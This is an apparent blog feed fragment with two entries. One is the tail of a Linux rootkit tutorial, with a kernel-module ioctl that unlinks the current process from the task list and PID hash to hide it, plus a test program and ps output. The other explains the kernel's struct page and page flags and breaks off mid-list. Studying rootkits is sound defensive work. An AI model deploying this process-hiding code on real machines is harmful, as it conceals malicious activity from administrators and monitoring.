class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">rootkit_ioctl</span><span class="params">(struct file *__file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> *<span class="title">cur_node</span>;</span></span><br><span class="line"></span><br><span class="line">    spin_lock(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">    cur_node = &amp;current-&gt;pid_links[PIDTYPE_PID];</span><br><span class="line"></span><br><span class="line">    list_del_rcu(&amp;current-&gt;tasks);</span><br><span class="line">    INIT_LIST_HEAD(&amp;current-&gt;tasks);</span><br><span class="line"></span><br><span class="line">    hlist_del_rcu(cur_node);</span><br><span class="line">    INIT_HLIST_NODE(cur_node);</span><br><span class="line">    cur_node-&gt;pprev = &amp;cur_node;</span><br><span class="line"></span><br><span class="line">    spin_unlock(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用上述代码即可删除当前进程的pid。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/rootkit&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;faild open rootkit!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ioctl(fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后编写一个用于测试的用户进程。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~ $ ./exp&amp;</span><br><span class="line">~ $ ps</span><br><span class="line">PID   USER     TIME  COMMAND</span><br><span class="line">    1 root      0:01 &#123;init&#125; /bin/sh /init kaslr</span><br><span class="line">  <span class="comment"># ... ...</span></span><br><span class="line">  140 ctf       0:00 sh</span><br><span class="line">  142 ctf       0:00 ps</span><br><span class="line">~ $ </span><br></pre></td></tr></table></figure><p>最终成功实现进程隐藏。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在毕业论文选题时选的是Linux Rootkit相关的内容，加上在前面的许多文章中挖了这个坑终于是现在可以进行填坑活动了😭！&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    
    <category term="LKM" scheme="https://196082.github.io/tags/LKM/"/>
    
  </entry>
  
  <entry>
    <title>Kernel内存管理</title>
    <link href="https://196082.github.io/2024/01/24/Kernel%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <id>https://196082.github.io/2024/01/24/Kernel%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</id>
    <published>2024-01-24T09:11:09.000Z</published>
    <updated>2024-01-24T09:10:57.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实这一篇打算的是写<code>syz-fuzzer</code>部分的源码分析或者是<code>Linux Rootkit</code>这两篇中的一篇，但是在前一篇文章中较为详细的分析了slub的分配流程，加上也有几位师傅说我的博客缺少基础知识，这也就让我想要不把也这篇文章给写了。这里说一下为什么我不愿意写这些基础的原因，在学校期间我不愿意写的主要原因是我想要不断的学习新东西（可以看到我前面玩过什么qemu，chrome之类的），随后会过一遍基础但是写下来就会有点费力不讨好的感觉。实习之后为什么不写的主要原因是，写基础是不能当作这一周干的事写进周报的，可以看到在上班期间我复现了很多CVE其实在那么多篇中也穿插了许多的基础知识，<del>对资本家的无声抵抗了属于是</del>。</p><p>当然，虽然前面理由那么多但是最严重的一个问题还是，没人看我博客😭，这也是让我一直犯懒的原因（不过留着自己看也是很好的）。</p><p><img   src="/images/OrsvS6GTMgPLx5E.png" ></p><h2 id="struct-page"><a href="#struct-page" class="headerlink" title="struct page"></a>struct page</h2><p>在前面的很多文章中都提到过<code>page</code>结构体，但是并没有拿出来详细解释过，这里也详细的阐述一下吧。在 <a class="link"   href="https://cv196082.gitee.io/2023/05/24/pipe-buffer/" >向pipe_buffer说yes！<i class="fas fa-external-link-alt"></i></a> 文章中我们是使用<code>off by null</code>导致两个<code>pipe_buffer-&gt;page</code>指针指向了同一个page结构体，而page结构体在 Linux Kernel 中用于表示一个物理页框同样每个物理页框也会对应一个page结构体，正是因为前面的对应关系存在我们才能够让后面的<code>pipe_buffer</code>结构体去占领对应的物理页框。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;<span class="comment">/* Atomic flags, some possibly</span></span><br><span class="line"><span class="comment"> * updated asynchronously */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Five words (20/40 bytes) are available in this union.</span></span><br><span class="line"><span class="comment"> * WARNING: bit 0 of the first word is used for PageTail(). That</span></span><br><span class="line"><span class="comment"> * means the other users of this union MUST NOT use the bit to</span></span><br><span class="line"><span class="comment"> * avoid collision and false-positive PageTail().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* Page cache and anonymous pages */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @lru: Pageout list, eg. active_list protected by</span></span><br><span class="line"><span class="comment"> * lruvec-&gt;lru_lock.  Sometimes used as a generic list</span></span><br><span class="line"><span class="comment"> * by the page owner.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Or, for the Unevictable &quot;LRU list&quot; slot */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="comment">/* Always even, to negate PageTail */</span></span><br><span class="line"><span class="keyword">void</span> *__filler;</span><br><span class="line"><span class="comment">/* Count page&#x27;s or folio&#x27;s mlocks */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> mlock_count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Or, free page */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">buddy_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">pcp_list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* See page-flags.h for PAGE_MAPPING_FLAGS */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="keyword">pgoff_t</span> index;<span class="comment">/* Our offset within mapping. */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> share;<span class="comment">/* share count for fsdax */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @private: Mapping-private opaque data.</span></span><br><span class="line"><span class="comment"> * Usually used for buffer_heads if PagePrivate.</span></span><br><span class="line"><span class="comment"> * Used for swp_entry_t if PageSwapCache.</span></span><br><span class="line"><span class="comment"> * Indicates order in the buddy system if PageBuddy.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* page_pool used by netstack */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @pp_magic: magic value to avoid recycling non</span></span><br><span class="line"><span class="comment"> * page_pool allocated pages.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pp_magic;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page_pool</span> *<span class="title">pp</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> _pp_mapping_pad;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> dma_addr;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * dma_addr_upper: might require a 64-bit</span></span><br><span class="line"><span class="comment"> * value on 32-bit architectures.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> dma_addr_upper;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For frag page support, not supported in</span></span><br><span class="line"><span class="comment"> * 32-bit architectures with 64-bit DMA.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">atomic_long_t</span> pp_frag_count;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* Tail pages of compound page */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> compound_head;<span class="comment">/* Bit zero is set */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* ZONE_DEVICE pages */</span></span><br><span class="line"><span class="comment">/** @pgmap: Points to the hosting device page map. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dev_pagemap</span> *<span class="title">pgmap</span>;</span></span><br><span class="line"><span class="keyword">void</span> *zone_device_data;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ZONE_DEVICE private pages are counted as being</span></span><br><span class="line"><span class="comment"> * mapped so the next 3 words hold the mapping, index,</span></span><br><span class="line"><span class="comment"> * and private fields from the source anonymous or</span></span><br><span class="line"><span class="comment"> * page cache page while the page is migrated to device</span></span><br><span class="line"><span class="comment"> * private memory.</span></span><br><span class="line"><span class="comment"> * ZONE_DEVICE MEMORY_DEVICE_FS_DAX pages also</span></span><br><span class="line"><span class="comment"> * use the mapping, index, and private fields when</span></span><br><span class="line"><span class="comment"> * pmem backed DAX files are mapped.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** @rcu_head: You can use this to free a page by RCU. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span><span class="comment">/* This union is 4 bytes in size. */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the page can be mapped to userspace, encodes the number</span></span><br><span class="line"><span class="comment"> * of times this page is referenced by a page table.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">atomic_t</span> _mapcount;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the page is neither PageSlab nor mappable to userspace,</span></span><br><span class="line"><span class="comment"> * the value stored here may help determine what this page</span></span><br><span class="line"><span class="comment"> * is used for.  See page-flags.h for a list of page types</span></span><br><span class="line"><span class="comment"> * which are currently stored here.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> page_type;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Usage count. *DO NOT USE DIRECTLY*. See page_ref.h */</span></span><br><span class="line"><span class="keyword">atomic_t</span> _refcount;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> memcg_data;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On machines where all RAM is mapped into kernel address space,</span></span><br><span class="line"><span class="comment"> * we can simply calculate the virtual address. On machines with</span></span><br><span class="line"><span class="comment"> * highmem some memory is mapped into kernel virtual memory</span></span><br><span class="line"><span class="comment"> * dynamically, so we need a place to store that address.</span></span><br><span class="line"><span class="comment"> * Note that this field could be 16 bits on x86 ... ;)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Architectures with slow multiplication can define</span></span><br><span class="line"><span class="comment"> * WANT_PAGE_VIRTUAL in asm/page.h</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span></span><br><span class="line"><span class="keyword">void</span> *<span class="keyword">virtual</span>;<span class="comment">/* Kernel virtual address (NULL if</span></span><br><span class="line"><span class="comment">   not kmapped, ie. highmem) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* WANT_PAGE_VIRTUAL */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KMSAN</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * KMSAN metadata for this page:</span></span><br><span class="line"><span class="comment"> *  - shadow page: every bit indicates whether the corresponding</span></span><br><span class="line"><span class="comment"> *    bit of the original page is initialized (0) or not (1);</span></span><br><span class="line"><span class="comment"> *  - origin page: every 4 bytes contain an id of the stack trace</span></span><br><span class="line"><span class="comment"> *    where the uninitialized value was created.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">kmsan_shadow</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">kmsan_origin</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> LAST_CPUPID_NOT_IN_PAGE_FLAGS</span></span><br><span class="line"><span class="keyword">int</span> _last_cpupid;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; _struct_page_alignment;</span><br></pre></td></tr></table></figure><p>在内核中page结构体的定义如上，这里不会将全部成员的含义进行解释只会解释较为重要或是后文中需要的。</p><h3 id="flags：标志位"><a href="#flags：标志位" class="headerlink" title="flags：标志位"></a>flags：标志位</h3><p>这个成员的含义很明显，用于表示该页处于什么样的状态</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">pageflags</span> &#123;</span></span><br><span class="line">PG_locked,<span class="comment">/* Page is locked. Don&#x27;t touch. */</span></span><br><span class="line">PG_writeback,<span class="comment">/* Page is under writeback */</span></span><br><span class="line">PG_referenced,</span><br><span class="line">PG_uptodate,</span><br><span class="line">PG_dirty,</span><br><span class="line">PG_lru,</span><br><span class="line">PG_head,<span class="comment">/* Must be in bit 6 */</span></span><br><span class="line">PG_waiters,<span class="comment">/* Page has waiters, check its waitqueue. Must be bit #7 and in the same byte as &quot;PG_locked&quot; */</span></span><br><span class="line">PG_active,</span><br><span class="line">PG_workingset,</span><br><span class="line">PG_error,</span><br><span class="line">PG_slab,</span><br><span class="line">PG_owner_priv_1,<span class="comment">/* Owner use. If pagecache, fs may use*/</span></span><br><span class="line">PG_arch_1,</span><br><span class="line">PG_reserved,</span><br><span class="line">PG_private,<span class="comment">/* If pagecache, has fs-private data */</span></span><br><span class="line">PG_private_2,<span class="comment">/* If pagecache, has fs aux data */</span></span><br><span class="line">PG_mappedtodisk,<span class="comment">/* Has blocks allocated on-disk */</span></span><br><span class="line">PG_reclaim,<span class="comment">/* To be reclaimed asap */</span></span><br><span class="line">PG_swapbacked,<span class="comment">/* Page is backed by RAM/swap */</span></span><br><span class="line">PG_unevictable,<span class="comment">/* Page is &quot;unevictable&quot;  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MMU</span></span><br><span class="line">PG_mlocked,<span class="comment">/* Page is vma mlocked */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ARCH_USES_PG_UNCACHED</span></span><br><span class="line">PG_uncached,<span class="comment">/* Page has been mapped as uncached */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_FAILURE</span></span><br><span class="line">PG_hwpoison,<span class="comment">/* hardware poisoned page. Don&#x27;t touch */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_PAGE_IDLE_FLAG) &amp;&amp; defined(CONFIG_64BIT)</span></span><br><span class="line">PG_young,</span><br><span class="line">PG_idle,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ARCH_USES_PG_ARCH_X</span></span><br><span class="line">PG_arch_2,</span><br><span class="line">PG_arch_3,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">__NR_PAGEFLAGS,</span><br><span class="line"></span><br><span class="line">PG_readahead = PG_reclaim,</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Depending on the way an anonymous folio can be mapped into a page</span></span><br><span class="line"><span class="comment"> * table (e.g., single PMD/PUD/CONT of the head page vs. PTE-mapped</span></span><br><span class="line"><span class="comment"> * THP), PG_anon_exclusive may be set only for the head page or for</span></span><br><span class="line"><span class="comment"> * tail pages of an anonymous folio. For now, we only expect it to be</span></span><br><span class="line"><span class="comment"> * set on tail pages for PTE-mapped THP.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PG_anon_exclusive = PG_mappedtodisk,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Filesystems */</span></span><br><span class="line">PG_checked = PG_owner_priv_1,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* SwapBacked */</span></span><br><span class="line">PG_swapcache = PG_owner_priv_1,<span class="comment">/* Swap page: swp_entry_t in private */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Two page bits are conscripted by FS-Cache to maintain local caching</span></span><br><span class="line"><span class="comment"> * state.  These bits are set on pages belonging to the netfs&#x27;s inodes</span></span><br><span class="line"><span class="comment"> * when those inodes are being locally cached.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PG_fscache = PG_private_2,<span class="comment">/* page backed by cache */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* XEN */</span></span><br><span class="line"><span class="comment">/* Pinned in Xen as a read-only pagetable page. */</span></span><br><span class="line">PG_pinned = PG_owner_priv_1,</span><br><span class="line"><span class="comment">/* Pinned as part of domain save (see xen_mm_pin_all()). */</span></span><br><span class="line">PG_savepinned = PG_dirty,</span><br><span class="line"><span class="comment">/* Has a grant mapping of another (foreign) domain&#x27;s page. */</span></span><br><span class="line">PG_foreign = PG_owner_priv_1,</span><br><span class="line"><span class="comment">/* Remapped by swiotlb-xen. */</span></span><br><span class="line">PG_xen_remapped = PG_owner_priv_1,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* non-lru isolated movable page */</span></span><br><span class="line">PG_isolated = PG_reclaim,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only valid for buddy pages. Used to track pages that are reported */</span></span><br><span class="line">PG_reported = PG_uptodate,</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line"><span class="comment">/* For self-hosted memmap pages */</span></span><br><span class="line">PG_vmemmap_self_hosted = PG_owner_priv_1,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Flags only valid for compound pages.  Stored in first tail page&#x27;s</span></span><br><span class="line"><span class="comment"> * flags word.  Cannot use the first 8 flags or any flag marked as</span></span><br><span class="line"><span class="comment"> * PF_ANY.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* At least one page in this folio has the hwpoison flag set */</span></span><br><span class="line">PG_has_hwpoisoned = PG_error,</span><br><span class="line">PG_hugetlb = PG_active,</span><br><span class="line">PG_large_rmappable = PG_workingset, <span class="comment">/* anon or file-backed */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面的枚举类型变量就对应了一个页的不同状态。</p><blockquote><p><code>PG_locked</code>：表示该页已被上锁，说明此时该页正在被使用</p><p><code>PG_referenced</code>：该页刚刚被访问过，该标志位与 <code>PG_reclaim</code> 标志位共同被用于匿名与文件备份缓存的页面回收</p><p><code>PG_uptodate</code>：该页处在最新状态，当对该页完成一次读取时，该页便变更为 up-to-date 状态，除非发生了磁盘 IO 错误</p><p><code>PG_dirty</code>：该页为脏页，即该页的内容已被修改，应当尽快将内容写回磁盘上</p><p><code>PG_lru</code>：该页处在一个 LRU 链表上</p><p><code>PG_active</code>：该页面位于活跃 lru 链表中</p><p><code>PG_workingset</code>：该页位于某个进程的工作集（即一个进程同时使用的内存数量，例如一个进程可能分配了114514MB内存，但是在同一时刻只使用其中的1919MB，这就是工作集）中</p><p><code>PG_waiters</code>：有进程在等待该页面</p><p><code>PG_error</code>：该页在 I&#x2F;O 过程中出现了差错</p><p><code>PG_slab</code>：该页由 slab 使用</p><p><code>PG_owner_priv_1</code>：该页由其所有者使用，若是作为 pagecache 页面，则可能是被文件系统使用</p><p><code>PG_arch_1</code>：该标志位与体系结构相关联</p><p><code>PG_reserved</code>：该页被保留，不能够被 swap out（内核会将不活跃的页交换到磁盘上）</p><p><code>PG_private</code> ：该页拥有私有数据（private 字段）</p><p><code>PG_writeback</code>：该页正在被写到磁盘上</p><p><code>PG_head</code>：在内核中有时需要将多个页组成一个 compound pages，而设置该状态时表明该页是 compound pages 的第一个页</p><p><code>PG_mappedtodisk</code>：该页被映射到硬盘中</p><p><code>PG_reclaim</code>：该页可以被回收</p><p><code>PG_swapbacked</code>：该页的后备存储器为 swap&#x2F;RAM</p><p><code>PG_unevictable</code>：该页不可被回收（被锁），且会出现在 